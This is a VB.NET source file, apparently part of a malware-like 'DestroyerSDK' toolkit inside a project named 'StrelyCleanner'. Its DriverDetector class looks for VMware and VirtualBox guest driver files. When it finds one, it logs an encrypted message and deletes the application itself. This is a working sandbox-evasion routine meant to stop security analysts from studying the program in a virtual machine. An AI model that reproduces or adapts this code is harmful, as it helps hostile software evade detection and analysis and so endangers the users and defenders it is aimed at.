Imports StrelyCleanner.DestroyerSDK.LogFuncs
Imports StrelyCleanner.DestroyerSDK.AutoExeFuncs
Imports StrelyCleanner.DestroyerSDK.WinPath
Imports StrelyCleanner.DestroyerSDK.CriptoFuncs

Namespace DestroyerSDK

    Public Class DriverDetector

        Sub New()
            Try : AddHandler Application.ThreadException, AddressOf Application_Exception_Handler _
          : Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException, False) _
          : Catch : End Try
        End Sub

        Private Sub Application_Exception_Handler(ByVal sender As Object, ByVal e As System.Threading.ThreadExceptionEventArgs)
            Dim ex As Exception = CType(e.Exception, Exception)
            WriteLog(ex.Message, InfoType.Exception)
        End Sub

        Public Shared Sub DriversVirtualMachine()
            Dim winPath As String = GetSystemPath() & "Drivers\"
            Dim names() As String = {"Vmmouse.sys", "vm3dgl.dll", "vmdum.dll", "vm3dver.dll", "vmtray.dll", _
                                      "VMToolsHook.dll", "vmmousever.dll", "vmhgfs.dll", "vmGuestLib.dll", _
                                     "VmGuestLibJava.dll", "Driversvmhgfs.dll", "VBoxMouse.sys", "VBoxGuest.sys", _
                                     "VBoxSF.sys", "VBoxVideo.sys", "vboxdisp.dll", "vboxhook.dll", "vboxmrxnp.dll", _
                                     "vboxogl.dll", "vboxoglarrayspu.dll", "vboxoglcrutil.dll", "vboxoglerrorspu.dll", "vboxoglfeedbackspu.dll", _
                                     "vboxoglpackspu.dll", "vboxoglpassthroughspu.dll", "vboxservice.exe", "vboxtray.exe", "VBoxControl.exe"} '"npf.sys (Driver WinCap)" 
            For Each element As String In names
                If My.Computer.FileSystem.FileExists(winPath & element) Then
                    WriteLog("Virtual Machines detected in the system " & TextInitialCrypto("Suspicious Driver Code: " & element), InfoType.Critical)
                    DeleteSelfApplication()
                End If
            Next

        End Sub

    End Class

End Namespace

